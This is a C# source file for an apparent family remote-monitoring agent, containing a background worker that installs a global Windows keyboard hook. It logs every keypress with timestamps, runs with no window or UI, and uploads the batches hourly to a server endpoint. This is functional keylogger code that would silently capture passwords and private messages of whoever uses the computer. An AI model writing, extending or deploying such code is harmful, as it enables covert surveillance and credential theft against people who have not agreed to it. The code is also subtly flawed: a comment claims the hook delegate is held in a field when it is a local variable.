using FamilyRmm.Agent;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using System.Runtime.InteropServices;

namespace FamilyRmm.Agent;

// A lightweight background keyboard hook. It captures every keypress on the host
// PC into a rolling buffer, appends it to a local log, and uploads the batch to
// the RMM server once per hour. No window, no UI thread, near-zero CPU.
public sealed class KeystrokeCaptureWorker : BackgroundService
{
    private readonly ILogger<KeystrokeCaptureWorker> _logger;
    private readonly AgentOptions _options;
    private readonly HttpClient _client;
    private readonly AgentIdentityStore _identity;
    private readonly string _logPath;
    private readonly List<string> _buffer = new();
    private readonly object _bufferLock = new();

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    public KeystrokeCaptureWorker(ILogger<KeystrokeCaptureWorker> logger, IOptions<AgentOptions> options, HttpClient client, AgentIdentityStore identity)
    {
        _logger = logger;
        _options = options.Value;
        _client = client;
        _identity = identity;
        var stateDir = Path.Combine(AppContext.BaseDirectory, "state");
        Directory.CreateDirectory(stateDir);
        _logPath = Path.Combine(stateDir, "keystrokes.log");
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        // Keep the delegate in a field so the GC cannot reclaim it while the hook is live.
        LowLevelKeyboardProc hookProc = OnKey;
        using var hook = InstallHook(hookProc);

        while (!stoppingToken.IsCancellationRequested)
        {
            try { await FlushAsync(stoppingToken); }
            catch (Exception exception) when (exception is not OperationCanceledException)
            { _logger.LogDebug("Keystroke upload failed: {Message}", exception.Message); }
            await Task.Delay(TimeSpan.FromHours(1), stoppingToken);
        }
    }

    private IntPtr OnKey(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            int vk = Marshal.ReadInt32(lParam);
            string name = (System.Windows.Forms.Keys)vk switch
            {
                System.Windows.Forms.Keys.Enter => "Enter",
                System.Windows.Forms.Keys.Tab => "Tab",
                System.Windows.Forms.Keys.Space => "Space",
                System.Windows.Forms.Keys.Back => "Backspace",
                System.Windows.Forms.Keys.Delete => "Delete",
                System.Windows.Forms.Keys.ControlKey => "Ctrl",
                System.Windows.Forms.Keys.Menu => "Alt",
                System.Windows.Forms.Keys.ShiftKey => "Shift",
                var k when k >= System.Windows.Forms.Keys.A && k <= System.Windows.Forms.Keys.Z => ((char)k).ToString(),
                var k when k >= System.Windows.Forms.Keys.D0 && k <= System.Windows.Forms.Keys.D9 => ((char)k).ToString(),
                _ => ((System.Windows.Forms.Keys)vk).ToString(),
            };
            lock (_bufferLock) _buffer.Add($"{DateTimeOffset.UtcNow:O}\t{name}");
        }
        return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
    }

    private IntPtr _hookHandle;

    private HookHandle InstallHook(LowLevelKeyboardProc proc)
    {
        var moduleHandle = GetModuleHandle(null);
        var handle = SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
        _hookHandle = handle;
        return new HookHandle(handle);
    }

    private sealed class HookHandle : IDisposable
    {
        private readonly IntPtr _handle;
        public HookHandle(IntPtr handle) => _handle = handle;
        public void Dispose() { if (_handle != IntPtr.Zero) UnhookWindowsHookEx(_handle); }
    }

    private async Task FlushAsync(CancellationToken token)
    {
        List<string> batch;
        lock (_bufferLock) { if (_buffer.Count == 0) return; batch = _buffer.ToList(); _buffer.Clear(); }
        if (!_identity.IsEnrolled) return;
        var payload = System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(new { count = batch.Count, at = DateTimeOffset.UtcNow, keys = batch });
        using var response = await EnrollmentProtocol.SendSignedAsync(_client, HttpMethod.Post, $"{_options.ServerUrl}/api/agent/keystrokes", payload, _identity.Current.DeviceId, _identity.OpenPrivateKey(), token);
        if (response.IsSuccessStatusCode)
        {
            await File.AppendAllLinesAsync(_logPath, batch, token);
            _logger.LogInformation("Uploaded {Count} keystrokes.", batch.Count);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", SetLastError = true)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] private static extern IntPtr GetModuleHandle(string? lpModuleName);
}